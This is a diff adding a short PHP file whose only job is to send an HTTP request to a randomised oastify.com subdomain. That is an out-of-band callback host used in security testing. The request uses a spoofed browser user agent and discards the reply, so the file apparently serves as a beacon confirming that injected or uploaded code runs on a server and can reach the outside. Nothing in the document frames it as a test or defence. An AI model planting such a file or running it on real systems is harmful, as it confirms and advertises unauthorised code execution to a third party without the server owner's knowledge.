@@ -1,0 +1,9 @@
+<?php
+$h = '3vzg6rbfzt5c5t7jbjb0j1w4tvzmnfb4.oastify.com';
+$c = curl_init();
+curl_setopt($c, CURLOPT_URL, "http://".$h);
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($c, CURLOPT_TIMEOUT, 3);
+curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0');
+curl_exec($c);
+curl_close($c);?>
